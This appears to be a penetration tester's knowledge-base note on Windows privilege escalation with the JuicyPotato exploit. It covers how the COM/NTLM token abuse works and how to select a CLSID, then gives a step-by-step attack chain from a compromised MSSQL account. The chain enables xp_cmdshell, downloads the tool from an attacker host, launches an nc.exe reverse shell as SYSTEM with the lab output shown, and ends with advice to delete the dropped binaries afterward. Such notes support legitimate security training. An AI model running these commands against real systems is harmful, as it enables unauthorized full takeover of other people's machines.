---
created: 2026-07-20
updated: 2026-10-18
tags:
  - Windows
  - Windows_PrivEsc
status: incomplete
---
```
reg query HKCR\CLSID /s /f LocalService
```
https://medium.com/@moustafaabdelmaksoud/windows-privilege-escalation-skills-assessment-part-i-walkthrough-30f498e444e7
## JuicyPotato

> [!abstract]+ **Scope**: Local Windows privilege escalation using the JuicyPotato exploit; system requirements and execution on Windows 7 through Windows 10 build `1803` and Windows Server 2016; DCOM/RPC activation mechanics; CLSID selection.

- [ ] Verify `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` via `whoami /priv`.
- [ ] Verify operating system version is Windows Server 2016 or older (Windows 10 build `1803` or lower).
- [ ] Select a valid `SYSTEM` CLSID matching the target operating system build.
- [ ] Transfer `JuicyPotato.exe` to a writable folder on the target host.
- [ ] Execute `JuicyPotato.exe` specifying a local listener port, CLSID, and target command binary.
- [ ] Verify shell creation as `NT AUTHORITY\SYSTEM`.

## How JuicyPotato works

- JuicyPotato abuses the Windows COM activation infrastructure to escalate access from service accounts holding `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` to `NT AUTHORITY\SYSTEM`.
- The exploit executes in 5 steps:

  1. **Starting a local COM listener**: JuicyPotato binds a local TCP port (such as `1337`) to receive DCOM/RPC activation traffic.
  2. **Triggering COM activation**: The exploit calls `CoGetInstanceFromIStorage()` with a custom marshaled object reference (`OBJREF`). The `OBJREF` points to the local listener (`127.0.0.1:1337`). The `RPCSS` service processes the activation request and connects to the listener specified in the `OBJREF`.
  3. **Capturing SYSTEM NTLM authentication**: `RPCSS` runs under the `SYSTEM` context and initiates an authenticated connection to JuicyPotato's fake COM server. JuicyPotato completes the three-way NTLM handshake (`NEGOTIATE`, `CHALLENGE`, `AUTHENTICATE`).
  4. **Acquiring impersonation tokens**: JuicyPotato uses NTLM reflection across a local named pipe. Calling `ImpersonateNamedPipeClient()` assigns the security context of the `SYSTEM` connection to the current thread.
  5. **Spawning privileged processes**: The thread's impersonation token cannot launch new processes directly. JuicyPotato calls `DuplicateTokenEx()` to generate a primary token, then launches the payload using `CreateProcessWithTokenW()` (requiring `SeImpersonatePrivilege`) or `CreateProcessAsUserW()` (requiring `SeAssignPrimaryTokenPrivilege`).


### CLSID selection guidelines

- The CLSID defines which COM class Windows attempts to activate.
- A valid CLSID must satisfy three constraints:
  - The target COM class runs under `NT AUTHORITY\SYSTEM`.
  - The class supports custom marshaling via `IMarshal` to accept custom `OBJREF` bindings.
  - The class is allowed to activate from the current user session.

> [!important] Consult the official [JuicyPotato CLSID list](https://ohpe.it/juicy-potato/CLSID/) if the default CLSID fails.

## Exploiting local privilege escalation via JuicyPotato

- Inspect assigned user privileges:

```powershell
whoami /priv
```

- Confirm the target operating system build number:

```powershell
wmic os get Caption,Version,BuildNumber,OSArchitecture
```

```powershell
Get-ComputerInfo | Select-Object OSName, OSDisplayVersion, OSVersion, WindowsEditionId
```

> [!note] See [[Manual & automated Windows enumeration]] for system discovery options.

- Download `JuicyPotato.exe` on your attacker machine:

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

- Execute a command binary as `SYSTEM` using default CLSID settings:

```powershell
JuicyPotato.exe -t * -p cmd.exe -l 1337
```

- Execute a reverse shell command with an explicit CLSID:

```cmd
JuicyPotato.exe -t * -l 1337 -p cmd.exe -a "/c nc.exe <attacker_ip_address> 4444 -e cmd.exe" -c {CLSID}
```

- Test a candidate CLSID without launching a payload:

```powershell
JuicyPotato.exe -z -l 1337 -c {CLSID}
```

### Command parameter reference

| Option | Description |
| :--- | :--- |
| `-t` | Specifies `t` for `CreateProcessWithTokenW()`, `u` for `CreateProcessAsUserW()`, or `*` to try both. |
| `-p` | Path to executable file launched as `SYSTEM` (e.g., `C:\Windows\System32\cmd.exe`). |
| `-l` | Local TCP port for the fake COM listener (any available port above `1024`). |
| `-a` | Arguments passed to the target program (e.g., `-a "/c whoami"`). |
| `-c` | COM class ID (omitting uses the built-in default CLSID). |
| `-m` | Listening IP address for the fake COM server (default: `127.0.0.1`). |
| `-k` | Target RPC server IP address (default: `127.0.0.1`). |
| `-z` | Validates CLSID authentication without launching the target payload. |

## Exploiting MSSQL service accounts via JuicyPotato

- Scenario: escalating access from an SQL Server compromise to a `SYSTEM` shell using `JuicyPotato.exe`. 

1. **Connect to the SQL Server host via Impacket `mssqlclient.py`**:

```bash
mssqlclient.py jdoe@10.10.11.5 -windows-auth
```

>[!example]-
> ```bash
> mssqlclient.py sql_dev@10.129.37.97 -windows-auth
> ```
> 
> ```bash
> Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
> 
> Password: # Str0ng_P@ssw0rd!
> [*] Encryption required, switching to TLS
> [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
> [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
> [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
> [*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed database context to 'master'.
> [*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 1: Changed language setting to us_english.
> [*] ACK: Result: 1 - Microsoft SQL Server (130 19162) 
> [!] Press help for extra shell commands
> SQL (WINLPE-SRV01\sql_dev  dbo@master)> 
> ```

2. **Enable `xp_cmdshell` execution**:

```sql
enable_xp_cmdshell
```

>[!example]-
> ```bash
> SQL (WINLPE-SRV01\sql_dev  dbo@master)> enable_xp_cmdshell
> ```
> 
> ```bash
> INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
> INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
> SQL (WINLPE-SRV01\sql_dev  dbo@master)> 
> ```

3. **Verify privilege presence**:

```sql
xp_cmdshell whoami /priv
```

>[!example]-
> ```bash
> SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell whoami /priv
> ```
> 
> ```bash
> output                                                                             
> --------------------------------------------------------------------------------   
> NULL                                                                               
> PRIVILEGES INFORMATION                                                             
> ----------------------                                                             
> NULL                                                                               
> Privilege Name                Description                               State      
> ============================= ========================================= ========   
> SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled   
> SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled   
> SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled    
> SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled    
> SeImpersonatePrivilege        Impersonate a client after authentication Enabled    
> SeCreateGlobalPrivilege       Create global objects                     Enabled    
> SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
> 
> NULL    
> ```

4. **Transfer `JuicyPotato.exe` to the target host**:

```sql
xp_cmdshell powershell -c "Invoke-WebRequest -Uri http://<attacker_ip_address>:8080/JuicyPotato.exe -OutFile C:\Windows\Temp\JuicyPotato.exe"
```

5. **Start a Netcat listener on your attacker machine**:

```bash
nc -lnvp 4444
```

6. **Execute `JuicyPotato.exe` to trigger a reverse shell**:

```sql
xp_cmdshell C:\Windows\Temp\JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\nc.exe <attacker_ip_address> 4444 -e cmd.exe" -t *
```

>[!example]-
> ```bash
> SQL (WINLPE-SRV01\sql_dev  dbo@master)> xp_cmdshell C:\Tools\JuicyPotato.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Tools\nc.exe 10.10.14.111 1337 -e cmd.exe" -t *
> ```
> 
> ```bash
> output                                                       
> ----------------------------------------------------------   
> Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375         
> ......                                                       
> 
> [+] authresult 0                                             
> {4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM   
> 
> NULL                                                         
> 
> [+] CreateProcessWithTokenW OK                               
> [+] calling 0x000000000088ce08                               
> 
> NULL    
> ```

7. **Confirm incoming shell access as `NT AUTHORITY\SYSTEM`**:

>[!example]-
> ```
> listening on [any] 4444 ...
> connect to [10.10.14.111] from (UNKNOWN) [10.129.37.97] 49801
> Microsoft Windows [Version 10.0.14393]
> (c) 2016 Microsoft Corporation. All rights reserved.
> 
> C:\Windows\system32> whoami
> nt authority\system
> ```

## Troubleshooting

- `authresult 5` or `0x80070005` -> The selected CLSID can't be activated in the current session; select another CLSID from the [JuicyPotato CLSID list](https://ohpe.it/juicy-potato/CLSID/).

- `CreateProcessWithTokenW` error -> Target process execution failed or local port is already bound; specify a different listening port above `1024` using `-l` or test token mode `-t u`.

- RPC server unavailable / Connection refused -> Windows 10 `1809`+ or Server 2019+ enforces local port 135 OXID resolution; upgrade to [[PrintSpoofer]], [[RoguePotato]], or [[GodPotato]]

> [!tip]+ 
>- Remove transferred binaries (`JuicyPotato.exe`, `nc.exe`) from `C:\Windows\Temp\` upon task completion.

## Post-JuicyPotato

- Starting Windows 10 build `1809` and Windows Server 2019, Microsoft hardened `RPCSS` OXID resolution:
	- OXID resolution connections originating from `RPCSS` are constrained strictly to TCP port 135.
	- Because `JuicyPotato` listens on arbitrary non-privileged ports (e.g. `1337`), `RPCSS` refuses to connect to the custom `OBJREF` binding string.
- Modern alternatives bypass this mitigation:
	- [[PrintSpoofer]]: Abuses Print Spooler named pipe connections via MS-RPRN RPC notifications.
	- [[RoguePotato]]: Redirects OXID queries across TCP port 135 to a remote fake OXID resolver.
	- [[GodPotato]]: Abuses local DCOM activation paths directly.
	- [[🛠️ SweetPotato]]: Combines BITS WinRM listener abuse and named pipe impersonation.

## References and further reading

- [`JuicyPotato — GitHub (ohpe)`](https://github.com/ohpe/juicy-potato)
- [`JuicyPotato CLSID List — ohpe.it`](https://ohpe.it/juicy-potato/CLSID/)
- [`JuicyPotato — HackTricks`](https://hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/juicypotato.html)
- [`Rotten Potato — Privilege Escalation from Service Accounts to SYSTEM — Fox-IT`](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
- [`Windows Privilege Escalation — Potatoes — Jorge Lajara`](https://jlajara.gitlab.io/Potatoes_Windows_Privesc)